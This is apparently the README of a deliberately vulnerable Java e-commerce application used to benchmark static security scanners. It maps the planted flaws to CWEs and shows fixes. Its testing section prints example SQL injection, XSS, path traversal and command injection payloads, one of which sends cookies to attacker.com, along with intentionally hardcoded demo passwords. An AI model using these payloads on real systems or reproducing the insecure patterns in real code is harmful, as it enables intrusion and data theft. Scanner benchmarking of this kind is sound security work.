# Deliberately Insecure Java E-Commerce Application

This is a deliberately insecure Java e-commerce application designed for testing SAST (Static Application Security Testing) tools like Checkmarx and CodeQL. It contains numerous security vulnerabilities and bad coding practices that should be detected by security scanning tools.

Repository: [insecure-app](https://github.com/samuelabdelsayed/insecure-app)

**⚠️ WARNING: DO NOT USE THIS CODE IN PRODUCTION OR EDUCATIONAL ENVIRONMENTS ⚠️**

This application is solely for testing the effectiveness of security scanning tools. It should never be deployed in any real environment or network. The vulnerabilities are intentional to help security professionals evaluate how well their scanning tools can detect common security issues.

## Purpose

The main goals of this application are to:

1. Demonstrate how SAST tools identify and report security vulnerabilities
2. Provide a benchmark for comparing different security scanning tools
3. Help developers and security professionals understand common vulnerability patterns
4. Train security teams on vulnerability recognition and remediation
5. Test the coverage and effectiveness of custom security rules and policies

## Vulnerability Categories

This application contains the following deliberate security vulnerabilities:

### 1. Vulnerable Dependencies
The POM file includes known vulnerable dependencies with published CVEs, including:
- Spring Framework 4.3.17.RELEASE (CVE-2018-1270, CVE-2018-1271, CVE-2018-1272)
- Apache Struts2 2.3.30 (CVE-2017-5638)
- Log4j 1.2.17 (CVE-2019-17571)
- Jackson 2.8.11 (CVE-2017-7525, CVE-2017-15095)
- Apache Commons Collections 3.2.1 (CVE-2015-7501)
- And others...

### 2. SQL Injection Vulnerabilities
- Direct inclusion of user input in SQL queries
- Multiple variants of SQL injection patterns
- Unsanitized database input

### 3. Cross-Site Scripting (XSS) Vulnerabilities
- Reflected XSS through various HTML contexts
- XSS in JavaScript context
- XSS in HTML attributes
- XSS in CSS/style attributes

### 4. Path Traversal Vulnerabilities
- Direct path manipulation without validation
- Zip Slip vulnerability in file extraction
- Directory traversal in file operations

### 5. Hardcoded Credentials
- Database credentials
- API keys
- Encryption keys
- AWS/Cloud provider credentials
- FTP/SSH credentials

### 6. Insecure File Operations
- Excessive file permissions
- Insecure temporary files
- Race conditions in file operations
- Insecure file deletion

### 7. Command Injection Vulnerabilities
- Direct user input in system commands
- Multiple command injection patterns
- Shell execution with user input

### 8. Insecure Deserialization
- Java object deserialization from untrusted sources
- Deserialization without proper validation
- Multiple serialization vulnerability patterns

### 9. Cryptographic Issues
- Weak encryption algorithms
- Hardcoded encryption keys
- Insecure SSL/TLS configuration

### 10. Other Vulnerabilities
- Information leakage
- Insecure cookie handling
- Missing access controls
- Insecure direct object references

## Files Overview

1. **Login.java** - Contains SQL injection and hardcoded credentials, main entry point
2. **Dashboard.java** - Main application UI with product browsing, cart management, and checkout
3. **Product.java** - Model class for products with deliberate insecure direct object references
4. **ShoppingCart.java** - Shopping cart implementation with security vulnerabilities
5. **ConfigManager.java** - Contains hardcoded credentials
6. **WebController.java** - Contains XSS vulnerabilities
7. **FileServlet.java** - Contains path traversal vulnerabilities
8. **FileManager.java** - Contains insecure file operations
9. **SystemCommandServlet.java** - Contains command injection vulnerabilities
10. **SerializationServlet.java** - Contains insecure deserialization vulnerabilities

## Vulnerability to CWE Mapping

This application implements vulnerabilities that map to these Common Weakness Enumeration (CWE) categories:

| File | Vulnerability | CWE |
|------|--------------|-----|
| Login.java | SQL Injection | CWE-89: SQL Injection |
| Login.java | Hardcoded Credentials | CWE-798: Use of Hard-coded Credentials |
| Login.java | Weak Cryptography | CWE-327: Use of a Broken or Risky Cryptographic Algorithm |
| Login.java | Insecure SSL/TLS | CWE-295: Improper Certificate Validation |
| WebController.java | Cross-Site Scripting | CWE-79: Improper Neutralization of Input During Web Page Generation |
| WebController.java | XSS in HTML Attributes | CWE-83: Improper Neutralization of Script in Attributes |
| WebController.java | XSS in JavaScript | CWE-94: Improper Control of Generation of Code |
| FileServlet.java | Path Traversal | CWE-22: Improper Limitation of a Pathname to a Restricted Directory |
| FileServlet.java | Zip Slip | CWE-29: Path Traversal: '\\..\\filename' |
| ConfigManager.java | Hardcoded API Keys | CWE-798: Use of Hard-coded Credentials |
| ConfigManager.java | Exposed Connection String | CWE-313: Cleartext Storage in a File or on Disk |
| FileManager.java | Insecure Permissions | CWE-276: Incorrect Default Permissions |
| FileManager.java | Race Condition | CWE-362: Concurrent Execution using Shared Resource with Improper Synchronization |
| FileManager.java | Resource Leak | CWE-404: Improper Resource Shutdown or Release |
| SystemCommandServlet.java | Command Injection | CWE-78: Improper Neutralization of Special Elements used in an OS Command |
| SerializationServlet.java | Insecure Deserialization | CWE-502: Deserialization of Untrusted Data |
| All Java Files | Various | CWE-1006: Bad Coding Practices |

This mapping can be used to validate that your SAST tools are properly categorizing detected vulnerabilities according to industry-standard CWE identifiers.

## Testing SAST Tools

This repository can be used to evaluate and compare how different SAST tools detect common security vulnerabilities. Use it to:

1. Compare detection rates between different SAST products
2. Tune and optimize scanning configurations
3. Test custom rules and policies
4. Train security teams on vulnerability recognition

### Using with Common SAST Tools

#### Checkmarx SAST

1. Set up a Checkmarx scan project
2. Configure the scan settings:
   - Source code management: Point to this repository
   - Preset: Default or High
3. Run the scan and analyze the results

#### SonarQube

1. Set up SonarQube server
2. Run the scan using:
   ```bash
   mvn sonar:sonar \
     -Dsonar.projectKey=insecure-java \
     -Dsonar.host.url=http://localhost:9000 \
     -Dsonar.login=your-token
   ```

#### CodeQL

1. Create a CodeQL database:
   ```bash
   codeql database create insecure-java-db --language=java --command="mvn clean compile"
   ```

2. Analyze the database:
   ```bash
   codeql database analyze insecure-java-db java-security-and-quality.qls --format=sarif-latest --output=results.sarif
   ```

#### Fortify

1. Translate the code:
   ```bash
   sourceanalyzer -b insecure-java -clean
   sourceanalyzer -b insecure-java -source 1.8 -cp "lib/**/*.jar" "src/main/java/**/*.java"
   ```

2. Scan the code:
   ```bash
   sourceanalyzer -b insecure-java -scan -f results.fpr
   ```

### Interpreting Results

When analyzing the scan results, pay attention to:

1. **Detection Rate**: How many of the intentional vulnerabilities were detected?
2. **False Positives**: Are there any vulnerabilities reported that aren't real?
3. **Detailed Analysis**: Does the tool provide useful remediation guidance?
4. **Prioritization**: Does the tool correctly identify the most critical issues?

### Comparative Analysis of SAST Tools

This application is designed to help evaluate different SAST tools. When comparing tools, consider:

#### Key Comparison Metrics

| Metric | Description |
|--------|-------------|
| **Coverage** | Percentage of known vulnerabilities detected |
| **Precision** | Ratio of true positives to all reported findings |
| **False Positive Rate** | Percentage of reported vulnerabilities that aren't actual issues |
| **Scan Time** | How long it takes to complete the analysis |
| **Usability** | Quality of reports, UI, and integration capabilities |
| **Remediation Guidance** | Quality of fix recommendations |

#### Vulnerability Categories to Compare

Different SAST tools may excel at finding different types of vulnerabilities:

1. **Input Validation Issues**: SQL injection, XSS, command injection
2. **Authentication Issues**: Hardcoded credentials, weak encryption
3. **Access Control Issues**: Path traversal, insecure permissions
4. **Dependency Issues**: Known vulnerable libraries
5. **Advanced Issues**: Insecure deserialization, race conditions

#### Sample Comparison Table

| Vulnerability Type | Tool A | Tool B | Tool C |
|-------------------|--------|--------|--------|
| SQL Injection | ✅ All instances | ✅ All instances | ⚠️ Some instances |
| XSS | ✅ All instances | ⚠️ Some instances | ✅ All instances |
| Path Traversal | ⚠️ Some instances | ✅ All instances | ❌ None detected |
| Command Injection | ✅ All instances | ✅ All instances | ✅ All instances |
| Hardcoded Credentials | ⚠️ Some instances | ⚠️ Some instances | ✅ All instances |
| Vulnerable Dependencies | ✅ All instances | ❌ None detected | ⚠️ Some instances |
| Insecure Deserialization | ❌ None detected | ⚠️ Some instances | ✅ All instances |

### Best Practices for SAST Testing

To get the most value from this application when testing SAST tools:

1. **Baseline Configuration**: Start with default configurations to establish a baseline
2. **Rule Optimization**: Tune rules to reduce false positives without sacrificing detection
3. **Incremental Testing**: Test one vulnerability category at a time
4. **Cross-Validation**: Verify findings through multiple tools or manual review
5. **Documentation**: Keep detailed records of findings, configurations, and tuning efforts
6. **Regular Updates**: Test with new tool versions as they're released

### Common SAST Tool Limitations

Understanding the limitations of SAST tools helps set realistic expectations:

1. **Context-Sensitivity**: Tools may miss vulnerabilities that depend on runtime context
2. **Framework Understanding**: Tools may struggle with custom frameworks or patterns
3. **Complex Vulnerabilities**: Multi-step vulnerabilities across components may be missed
4. **False Positives**: All tools generate some level of false positives
5. **Configuration Dependency**: Results heavily depend on proper configuration

## Best Practices for Security Testing

### Integrating SAST into Development Workflow

To effectively use SAST tools in real development environments:

1. **Shift Left**: Integrate scanning early in development, not just before release
2. **CI/CD Integration**: Automate scanning in your CI/CD pipeline
3. **Developer Feedback**: Ensure findings are accessible to developers, not just security teams
4. **Quality Gates**: Define security thresholds that must be met before code promotion
5. **Incremental Scanning**: Run incremental scans on changed code, full scans periodically

### Remediation Examples

Below are examples of how to remediate some common vulnerabilities in this codebase:

#### SQL Injection Fix

```java
// VULNERABLE:
rs = stmt.executeQuery("SELECT * FROM users WHERE username = '" + user + "'");

// FIXED:
PreparedStatement pstmt = conn.prepareStatement("SELECT * FROM users WHERE username = ?");
pstmt.setString(1, user);
rs = pstmt.executeQuery();
```

#### XSS Prevention

```java
// VULNERABLE:
out.println("<h1>Welcome, " + username + "!</h1>");

// FIXED:
out.println("<h1>Welcome, " + StringEscapeUtils.escapeHtml4(username) + "!</h1>");
```

#### Path Traversal Fix

```java
// VULNERABLE:
File file = new File(BASE_DIR + fileName);

// FIXED:
File requestedFile = new File(fileName);
File file = new File(BASE_DIR, requestedFile.getName());
```

#### Command Injection Fix

```java
// VULNERABLE:
String command = "ping -c 4 " + host;
Process process = Runtime.getRuntime().exec(command);

// FIXED:
ProcessBuilder pb = new ProcessBuilder("ping", "-c", "4", host);
pb.redirectErrorStream(true);
Process process = pb.start();
```

#### Secure Credential Management

```java
// VULNERABLE:
private static final String DB_PASSWORD = "S3cr3tP@ssw0rd!";

// FIXED:
private String getDbPassword() {
    return System.getenv("DB_PASSWORD");  // Get from environment or secure vault
}
```

## Building and Running the Application

### Prerequisites

- JDK 8 or higher
- Maven 3.6 or higher
- A servlet container like Tomcat (for web components) or run in standalone mode

### Setting Up the Development Environment

#### Installing Java

1. Download and install the JDK from Oracle's website: https://www.oracle.com/java/technologies/javase-downloads.html
   - For macOS, you can also use Homebrew: `brew install openjdk@11`
   - For Ubuntu/Debian: `sudo apt install openjdk-11-jdk`
   - For Windows: Download the installer from Oracle's website

2. Verify Java installation:
```bash
java -version
```

#### Installing Maven

1. Download Maven from: https://maven.apache.org/download.cgi
2. Extract the archive to a directory of your choice
3. Add Maven's bin directory to your PATH environment variable

   For macOS/Linux:
   ```bash
   # Add to your .bashrc, .zshrc, or equivalent
   export PATH=/path/to/maven/bin:$PATH
   ```

   For Windows:
   - Add the path to the Maven bin directory to your PATH environment variable
   - See: https://maven.apache.org/install.html

4. Verify Maven installation:
```bash
mvn -version
```

### Building the Application

Once Java and Maven are installed, run the following command in the project root directory:

```bash
mvn clean package
```

This will compile the code and create a JAR file in the `target` directory.

### Running the E-Commerce Application (Standalone)

The main E-Commerce application can be run directly as a standalone Java Swing application:

```bash
java -jar target/gs-maven-0.1.0.jar
```

This will open a login window where you can test:
1. SQL injection vulnerabilities
2. Full e-commerce functionality including product browsing, shopping cart, and checkout
3. Various security vulnerabilities throughout the application

#### Demo Credentials

For testing purposes, you can use these credentials to log in:
- Username: `admin`, Password: `admin123`
- Username: `user`, Password: `password`
- Username: `test`, Password: `test123`

These credentials are intentionally hardcoded and should be detected by SAST tools.

#### Manual Compilation (Alternative)

If you're having trouble with Maven, you can manually compile the Login application:

1. Create a directory for compiled classes:
```bash
mkdir -p classes
```

2. Compile the Login.java file:
```bash
javac -d classes src/main/java/Login.java
```

3. Run the application:
```bash
java -cp classes Login
```

### Running the Web Components (Optional)

To run the web components (servlets), you'll need to deploy the application to a servlet container like Tomcat. 

1. Copy the generated WAR file to your Tomcat webapps directory
2. Start Tomcat
3. Access the application at `http://localhost:8080/insecure-java`

#### Tomcat Setup (Quick Guide)

1. Download Tomcat from: https://tomcat.apache.org/download-90.cgi
2. Extract the archive to a directory of your choice
3. Start Tomcat:
   ```bash
   # On macOS/Linux
   cd /path/to/tomcat/bin
   chmod +x *.sh
   ./startup.sh
   
   # On Windows
   cd \path\to\tomcat\bin
   startup.bat
   ```

4. Deploy your application by copying your WAR file to the `webapps` directory
5. Access Tomcat at http://localhost:8080

### E-Commerce Application Features

The application has been expanded to include full e-commerce functionality while maintaining the deliberate security vulnerabilities for SAST testing:

### 1. User Authentication
- Login form with SQL injection vulnerabilities
- Hardcoded credentials
- Insecure cookie handling
- Weak encryption

### 2. Product Browsing
- Product catalog with insecure search functionality
- Vulnerable to XSS through product descriptions
- Insecure direct object references

### 3. Shopping Cart
- Add/remove/update items in cart
- Quantity manipulation
- No validation of inputs
- Exposure of sensitive session IDs

### 4. Checkout Process
- Collects payment information without proper security
- Stores sensitive data insecurely
- No validation on critical fields
- Lacks proper encryption for payment data

### 5. User Session Management
- Insecure logout implementation
- Weak session identifiers
- No session timeout
- Vulnerable to session fixation

## Testing Vulnerabilities

Below are detailed explanations of key vulnerabilities in the application with examples of how to test them:

#### SQL Injection Vulnerabilities

**Location**: `Login.java` - In the `actionPerformed` method

**Example Exploits**:
```
' OR '1'='1
' OR 1=1; --
admin'; --
" OR ""="
```

**How it works**: The application directly concatenates user input into SQL queries without proper sanitization, allowing an attacker to modify the query's logic.

**SAST Detection**: Tools should identify string concatenation in SQL queries as a security risk and suggest using prepared statements instead.

#### Cross-Site Scripting (XSS) Vulnerabilities

**Location**: `WebController.java` - In the `doGet` method

**Example Exploits**:
```
<script>alert('XSS')</script>
<img src="x" onerror="alert(1)">
javascript:alert(document.cookie)
<svg onload="fetch('https://attacker.com?cookie='+document.cookie)">
```

**How it works**: The application directly outputs user input to the HTML response without proper encoding, allowing script execution.

**SAST Detection**: Tools should identify direct inclusion of request parameters in HTML output and suggest proper output encoding.

#### Path Traversal Vulnerabilities

**Location**: `FileServlet.java` - In the `doGet` method

**Example Exploits**:
```
../../../etc/passwd
..%2f..%2f..%2fetc%2fpasswd
..\..\..\windows\system32\drivers\etc\hosts
```

**How it works**: The application doesn't validate file paths, allowing navigation outside intended directories.

**SAST Detection**: Tools should detect concatenation of user input with file paths and suggest path canonicalization and validation.

#### Command Injection Vulnerabilities

**Location**: `SystemCommandServlet.java` - In the `executePingCommand` method

**Example Exploits**:
```
localhost; ls -la
127.0.0.1 && cat /etc/passwd
127.0.0.1 | whoami
google.com` ls -la `/
```

**How it works**: The application passes user input directly to system command execution functions without sanitization.

**SAST Detection**: Tools should identify use of Runtime.exec() or ProcessBuilder with user input and suggest input validation or safer alternatives.

#### Hardcoded Credentials

**Location**: `ConfigManager.java` - Multiple fields and methods

**Example**:
```java
private static final String DB_PASSWORD = "S3cr3tP@ssw0rd!";
```

**How it works**: Sensitive credentials are hardcoded in the source code rather than stored securely in a configuration system.

**SAST Detection**: Tools should detect hardcoded passwords, API keys, and other credentials in source code.

#### Insecure Deserialization

**Location**: `SerializationServlet.java` - In the `deserializeUserProfile` method

**Example Exploit**: Creating a serialized Java object with a malicious payload that executes code during deserialization.

**How it works**: The application deserializes Java objects from untrusted sources without validation.

**SAST Detection**: Tools should identify use of ObjectInputStream with untrusted data and suggest safer alternatives or validation.

## Disclaimer

This code is PROVIDED AS IS, WITHOUT WARRANTY OF ANY KIND. The author is not responsible for any damage caused by the misuse of this code. This code is meant for testing security tools only and should never be used in a production environment or connected to the public internet. 

**IMPORTANT**: Run this application ONLY in isolated, controlled environments that are disconnected from any network containing sensitive data or systems.
